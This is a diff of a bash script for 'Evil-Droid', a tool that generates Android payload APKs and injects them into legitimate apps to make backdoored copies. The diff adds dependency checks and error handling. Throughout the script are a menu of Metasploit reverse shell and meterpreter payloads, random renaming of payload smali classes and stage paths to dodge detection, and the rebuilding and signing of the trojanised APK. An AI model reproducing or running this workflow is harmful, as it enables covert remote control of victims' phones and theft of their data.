@@ -1,13 +1,13 @@
 #!/usr/bin/env bash
 #
 # Evil-Droid Framework . version 0.1
-# Evil-Droid is a framework that create & generate & embed apk payload to penetrate androis-os
+# Evil-Droid is a framework that create & generate & embed apk payload to penetrate android platform
 # 
 #                  Created By Mascerano Bachir .
 #                 Website: http://www.dev-labs.co
 #           YTB : https://www.youtube.com/c/mascerano%20bachir  
 #        FCB : https://www.facebook.com/kali.linux.pentesting.tutorials
-#Special thanks to : MrPedroubuntu , Kader Achraf and Mohammed Yacine
+#Speciak thanks to : MrPedroubuntu , Kader Achraf and Mohammed Yacine
 #
 # this is an open source tool if you want to modify or add something . Please give me a copy.
 
@@ -57,7 +57,7 @@ sleep 2
 path=`pwd`
 lanip=`ip route get 1 | awk '{print $NF;exit}'`
 publicip=`dig +short myip.opendns.com @resolver1.opendns.com`
-ver="v0.1"
+ver="v0.2"
 VAR1=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali dir renaming
 VAR2=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali dir renaming
 VAR3=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Payload.smali renaming
@@ -188,6 +188,24 @@ clear
 echo -e $blue "[ ✔ ] Done installing .... "
 which apktool > /dev/null 2>&1
 fi
+#check for zipalign
+which zipalign > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+echo -e $green "[ ✔ ] Zipalign..........................${LighGreenF}[ found ]"
+which aapt > /dev/null 2>&1
+sleep 2
+else
+echo ""
+echo -e $red "[ X ] Zipalign -> ${RedF}not found! "
+sleep 2
+echo -e $yellow "[ ! ] Installing Zipalign "
+sleep 2
+echo -e $green ""
+sudo apt-get install zipalign -y
+clear
+echo -e $blue "[ ✔ ] Done installing .... "
+which zipalign > /dev/null 2>&1
+fi
 directory="$path/evilapk"
 if [ ! -d "$directory" ]; then
 	echo "Creating the output directory..."
@@ -241,6 +259,10 @@ function get_payload()
 {
   PAYLOAD=$(zenity --list --title "☢ EVIL-DROID ☢" --text "\nChose payload option:" --radiolist --column "Choose" --column "Option" TRUE "android/shell/reverse_tcp" FALSE "android/shell/reverse_http" FALSE "android/shell/reverse_https" FALSE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" FALSE "android/meterpreter_reverse_tcp" FALSE "android/meterpreter_reverse_http" FALSE "android/meterpreter_reverse_https" --width 400 --height 400 2> /dev/null)
 }
+function get_payload1()
+{
+  PAYLOAD=$(zenity --list --title "☢ EVIL-DROID ☢" --text "\nChose payload option:" --radiolist --column "Choose" --column "Option" TRUE "android/shell/reverse_tcp" FALSE "android/shell/reverse_http" FALSE "android/shell/reverse_https" FALSE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" --width 400 --height 400 2> /dev/null)
+}
 #function name
 function payload_name()
 {
@@ -281,8 +303,33 @@ function apk_comp()
  echo "[*] Rebuilding APK file..."
  spinlong
  xterm -T "Rebuilding APK" -e apktool b $path/payload > /dev/null 2>&1
- mv payload/dist/$apk_name.apk $path
- rm -r payload
+ mv payload/dist/$apk_name.apk $path > /dev/null 2>&1
+ rm -r payload > /dev/null 2>&1
+}
+#function errors
+function error()
+{
+ rc=$?
+ if [ $rc != 0 ]; then
+   echo -e $red ""
+   echo "【X】 Failed to rebuild backdoored apk【X】"
+   echo
+   apache_svc_stop
+   postgresql_stop
+   exit $rc
+ fi
+}
+function error0()
+{
+ rc=$?
+ if [ $rc != 0 ]; then
+   echo -e $red ""
+   echo "【X】 An Error Was Occured .Ty Again【X】"
+   echo
+   apache_svc_stop
+   postgresql_stop
+   exit $rc
+ fi
 }
 #function apache2 service
 function apache_svc_start()
@@ -313,7 +360,10 @@ function flagg()
  mv payload/smali/com/$VAR1/$VAR2/Payload.smali payload/smali/com/$VAR1/$VAR2/$VAR3.smali
  sleep 2
  if [ -f payload/smali/com/$VAR1/$VAR2/PayloadTrustManager.smali ]; then
+    echo
     echo -e $red "[ X ] an error was occured . Please upgrade your distro .."
+    apache_svc_stop
+    postgresql_stop
     exit 1
  fi
  sed -i "s#/metasploit/stage#/$VAR1/$VAR2#g" payload/smali/com/$VAR1/$VAR2/*
@@ -356,7 +406,10 @@ function sign()
  echo "[✔] Done."
  spinlong
  if [ $rc != 0 ]; then
+   echo -e $red ""
    echo "[!] Failed to verify signed artifacts"
+   apache_svc_stop
+   postgresql_stop
    exit $rc
  fi
 }
@@ -488,7 +541,8 @@ function main()
                 echo
                 spinlong
                 gen_payload
-                mv $apk_name.apk $path/evilapk
+                mv $apk_name.apk $path/evilapk > /dev/null 2>&1
+                error0
                 sleep 2
                 echo ""
                 zenity --title "☢ EVIL-DROID ☢" --info --text "APK PAYLOAD : $path/evilapk/$apk_name.apk " --width 400 > /dev/null 2>&1
@@ -507,7 +561,9 @@ function main()
                 echo
                 spinlong
                 embed_payload
-                mv $apk_name.apk $path/evilapk
+                echo 
+                mv $apk_name.apk $path/evilapk > /dev/null 2>&1
+                error
                 sleep 2
                 echo ""
                 zenity --title "☢ EVIL-DROID ☢" --info --text "BACKDOORED APK : $path/evilapk/$apk_name.apk " --width 400 > /dev/null 2>&1
@@ -520,10 +576,11 @@ function main()
                 get_lport
                 echo
                 payload_name
-                get_payload
+                get_payload1
                 echo
                 quests
-                mv $apk_name.apk $path/evilapk
+                mv $apk_name.apk $path/evilapk > /dev/null 2>&1
+                error
                 sleep 2
                 echo 
                 zenity --title "☢ EVIL-DROID ☢" --info --text "APK SIGNED : $path/evilapk/$apk_name.apk " --width 400 > /dev/null 2>&1
@@ -563,4 +620,3 @@ function main()
     done
 }
 main
-
